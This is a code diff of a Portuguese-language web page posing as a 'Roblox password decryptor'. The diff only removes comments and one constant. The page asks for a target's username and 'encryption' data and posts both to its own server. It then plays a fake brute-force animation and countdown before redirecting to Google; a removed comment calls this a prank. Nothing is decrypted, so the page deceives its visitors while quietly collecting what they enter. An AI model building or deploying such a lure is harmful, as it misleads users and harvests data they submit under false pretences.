@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Descriptografador de Roblox</title>
   <style>
-    /* ===== ESTILOS GLOBAIS ===== */
     * {
       margin: 0;
       padding: 0;
@@ -25,7 +24,6 @@
       overflow-x: hidden;
     }
 
-    /* Grade de fundo */
     body::before {
       content: '';
       position: fixed;
@@ -126,7 +124,6 @@
       box-shadow: 0 0 25px #00ffcc88;
     }
 
-    /* ===== TELA DE CARREGAMENTO ===== */
     .loading-screen {
       display: none;
       flex-direction: column;
@@ -182,7 +179,6 @@
 <body>
 
 <div class="container" id="mainContainer">
-  <!-- FORMULÁRIO PRINCIPAL -->
   <div id="formSection">
     <h1>🔓 Descriptografador de Roblox</h1>
     <p class="subtitle">Insira os dados do alvo e a criptografia para descriptografar a senha</p>
@@ -196,7 +192,6 @@
     <button class="btn" id="decryptBtn">Descriptografar senha</button>
   </div>
 
-  <!-- TELA DE CARREGAMENTO -->
   <div id="loadingSection" class="loading-screen hidden">
     <div class="lock-icon">🔐</div>
     <div class="glitch-text" id="glitchText">BRUTE FORCE em andamento...</div>
@@ -206,7 +201,6 @@
 </div>
 
 <script>
-  // ===== DOM =====
   const formSection = document.getElementById('formSection');
   const loadingSection = document.getElementById('loadingSection');
   const decryptBtn = document.getElementById('decryptBtn');
@@ -215,13 +209,10 @@
   const timerDisplay = document.getElementById('timerDisplay');
   const glitchText = document.getElementById('glitchText');
 
-  // ===== Variáveis de controle =====
   let countdownInterval = null;
   let glitchInterval = null;
-  let totalSeconds = 20 * 60; // 20 minutos
-  const TARGET_SECONDS = 20 * 60 - 83; // 20min - 1min23s = 18min37s (1117 segundos)
+  let totalSeconds = 20 * 60;
 
-  // ===== Função para gerar texto "glitch" =====
   function generateGlitch() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*()';
     let result = '';
@@ -232,7 +223,6 @@
     return result;
   }
 
-  // ===== Iniciar animação de glitch =====
   function startGlitch() {
     if (glitchInterval) clearInterval(glitchInterval);
     glitchInterval = setInterval(() => {
@@ -240,7 +230,6 @@
     }, 80);
   }
 
-  // ===== Iniciar contagem regressiva =====
   function startCountdown() {
     if (countdownInterval) clearInterval(countdownInterval);
 
@@ -250,18 +239,15 @@
       if (totalSeconds <= 0) {
         clearInterval(countdownInterval);
         clearInterval(glitchInterval);
-        // Redirecionar para Google (caso não tenha sido redirecionado antes)
         window.location.href = 'https://www.google.com';
         return;
       }
 
-      // Atualizar display do timer
       const mins = Math.floor(totalSeconds / 60);
       const secs = totalSeconds % 60;
       timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
 
-      // Verificar se atingiu 01:23
-      if (totalSeconds === 83) { // 83 segundos = 01:23
+      if (totalSeconds === 83) {
         clearInterval(countdownInterval);
         clearInterval(glitchInterval);
         window.location.href = 'https://www.google.com';
@@ -269,7 +255,6 @@
     }, 1000);
   }
 
-  // ===== Enviar dados e iniciar pegadinha =====
   async function handleDecrypt() {
     const username = usernameInput.value.trim();
     const content = contentInput.value.trim();
@@ -279,7 +264,6 @@
       return;
     }
 
-    // Enviar para o servidor
     try {
       const response = await fetch('/api/submit', {
         method: 'POST',
@@ -291,16 +275,13 @@
 
       const data = await response.json();
       if (data.success) {
-        // Esconder formulário e mostrar tela de carregamento
         formSection.classList.add('hidden');
         loadingSection.classList.remove('hidden');
         loadingSection.style.display = 'flex';
 
-        // Resetar timer
         totalSeconds = 20 * 60;
         timerDisplay.textContent = '20:00';
 
-        // Iniciar animações
         startGlitch();
         startCountdown();
       } else {
@@ -312,10 +293,8 @@
     }
   }
 
-  // ===== Evento do botão =====
   decryptBtn.addEventListener('click', handleDecrypt);
 
-  // ===== (Opcional) Enter para enviar =====
   document.addEventListener('keydown', (e) => {
     if (e.key === 'Enter' && (e.target === usernameInput || e.target === contentInput)) {
       handleDecrypt();
